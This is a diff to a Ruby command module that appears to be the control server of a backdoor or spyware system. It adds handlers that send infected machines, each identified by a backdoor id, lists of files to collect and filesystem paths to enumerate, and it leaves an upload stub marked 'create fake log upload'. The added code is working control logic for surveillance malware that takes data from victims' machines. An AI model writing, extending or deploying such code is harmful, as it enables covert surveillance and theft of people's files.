@@ -67,9 +67,9 @@ module Commands
     # the results are actually downloaded and saved locally
     # we will retrieve the content when the backdoor ask for them later
     available += [PROTO_CONF].pack('i') if DB.instance.new_conf? session[:bid]
-    available += [PROTO_DOWNLOAD].pack('i') if DB.instance.new_download? session[:bid]
-    available += [PROTO_UPLOAD].pack('i') if DB.instance.new_upload? session[:bid]
-    available += [PROTO_FILESYSTEM].pack('i') if DB.instance.new_filesystem? session[:bid]
+    available += [PROTO_DOWNLOAD].pack('i') if DB.instance.new_downloads? session[:bid]
+    available += [PROTO_UPLOAD].pack('i') if DB.instance.new_uploads? session[:bid]
+    available += [PROTO_FILESYSTEM].pack('i') if DB.instance.new_filesystems? session[:bid]
 
     # calculate the total size of the response
     tot = time.length + 4 + available.length
@@ -96,10 +96,10 @@ module Commands
     return [PROTO_OK].pack('i')
   end
 
+  # Protocol Conf
   # -> PROTO_CONF
   # <- PROTO_NO | PROTO_OK [ Conf ]
   def command_conf(peer, session, message)
-
     trace :info, "[#{peer}][#{session[:cookie]}] Configuration request"
 
     # the conf was already retrieved (if any) during the ident phase
@@ -118,16 +118,75 @@ module Commands
     return response
   end
 
-
+  # Protocol Upload
+  # -> PROTO_UPLOAD
+  # <- PROTO_NO | PROTO_OK [ left, filename, content ]
   def command_upload(peer, session, message)
+    trace :info, "[#{peer}][#{session[:cookie]}] Upload request"
+
     #TODO: implement
+
+    #TODO: create fake log upload
   end
+
+  # Protocol Download
+  # -> PROTO_DOWNLOAD
+  # <- PROTO_NO | PROTO_OK [ numElem, [file1, file2, ...]]
   def command_download(peer, session, message)
-    #TODO: implement
+    trace :info, "[#{peer}][#{session[:cookie]}] Download request"
+
+    # the download list was already retrieved (if any) during the ident phase
+    # here we get just the content (locally) without asking again to the db
+    downloads = DB.instance.new_downloads session[:bid]
+
+    # send the response
+    if downloads.empty? then
+      trace :info, "[#{peer}][#{session[:cookie]}] NO downloads"
+      response = [PROTO_NO].pack('i')
+    else
+      response = [PROTO_OK].pack('i')
+      list = ""
+      # create the list of patterns to download
+      downloads.each do |dow|
+        trace :info, "[#{peer}][#{session[:cookie]}] #{dow}"
+        list += dow.pascalize
+      end
+      response += [list.length + 4].pack('i') + [downloads.size].pack('i') + list
+      trace :info, "[#{peer}][#{session[:cookie]}] #{downloads.size} download requests sent"
+    end
+
+    return response
   end
+
+  # Protocol Filesystem
+  # -> PROTO_FILESYSTEM
+  # <- PROTO_NO | PROTO_OK [ numElem,[ depth1, dir1, depth2, dir2, ... ]]
   def command_filesystem(peer, session, message)
-    #TODO: implement
+    trace :info, "[#{peer}][#{session[:cookie]}] Filesystem request"
+
+    # the filesystem list was already retrieved (if any) during the ident phase
+    # here we get just the content (locally) without asking again to the db
+    filesystems = DB.instance.new_filesystems session[:bid]
+
+    # send the response
+    if filesystems.empty? then
+      trace :info, "[#{peer}][#{session[:cookie]}] NO filesystem"
+      response = [PROTO_NO].pack('i')
+    else
+      response = [PROTO_OK].pack('i')
+      list = ""
+      # create the list of patterns to download
+      filesystems.each do |fs|
+        trace :info, "[#{peer}][#{session[:cookie]}] #{fs[:depth]} #{fs[:path]}"
+        list += [fs[:depth]].pack('i') + fs[:path].pascalize
+      end
+      response += [list.length + 4].pack('i') + [filesystems.size].pack('i') + list
+      trace :info, "[#{peer}][#{session[:cookie]}] #{filesystems.size} filesystem requests sent"
+    end
+
+    return response
   end
+
   def command_evidence(peer, session, message)
     #TODO: implement
   end
